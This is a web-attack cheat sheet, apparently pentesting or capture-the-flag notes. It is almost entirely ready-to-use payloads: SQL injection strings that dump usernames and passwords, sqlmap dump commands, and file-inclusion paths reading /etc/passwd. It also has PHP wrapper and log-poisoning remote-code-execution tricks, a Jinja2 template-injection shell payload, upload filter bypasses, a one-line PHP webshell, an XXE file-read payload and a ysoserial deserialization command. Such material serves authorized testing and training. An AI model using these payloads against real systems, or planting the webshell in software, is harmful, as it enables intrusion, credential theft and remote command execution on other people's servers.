# Web Application Attacks

## SQL Injection

### Detection
```
' OR 1=1-- -
" OR 1=1-- -
' UNION SELECT NULL-- -
```

### Union-based extraction
```sql
' UNION SELECT 1,2,3-- -                          -- find column count
' UNION SELECT 1,version(),3-- -                   -- DB version
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### sqlmap
```bash
sqlmap -u "http://$IP/page?id=1" --batch --dbs
sqlmap -u "http://$IP/page?id=1" --batch -D dbname --tables
sqlmap -u "http://$IP/page?id=1" --batch -D dbname -T users --dump
# POST request
sqlmap -r request.txt --batch --dbs
```

## Local File Inclusion (LFI)

### Basic
```
http://$IP/page?file=../../../etc/passwd
http://$IP/page?file=....//....//....//etc/passwd
```

### PHP wrappers
```
# base64 read source
php://filter/convert.base64-encode/resource=index.php
# RCE via input
php://input  (POST: <?php system($_GET['cmd']); ?>)
# data wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### Log poisoning → RCE
```bash
# poison access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://$IP/
# include log
http://$IP/page?file=../../../var/log/apache2/access.log&cmd=id
```

## Server-Side Template Injection (SSTI)

### Detection
```
{{7*7}}     → 49 = Jinja2/Twig
${7*7}      → 49 = Freemarker/Velocity
<%= 7*7 %>  → 49 = ERB
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## File Upload

### Bypass extensions
```
shell.php    → blocked
shell.pHp    → case bypass
shell.php5   → alt extension
shell.php.jpg → double ext
shell.php%00.jpg → null byte (old PHP)
```

### Webshell
```php
<?php system($_GET['cmd']); ?>
```

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Deserialization

### PHP
```
O:4:"User":1:{s:4:"name";s:4:"test";}
# modify class properties, chain __destruct/__wakeup
```

### Java
```bash
# detect: base64 blob starting with rO0AB or AC ED 00 05 in hex
ysoserial CommonsCollections1 'cmd' | base64
```
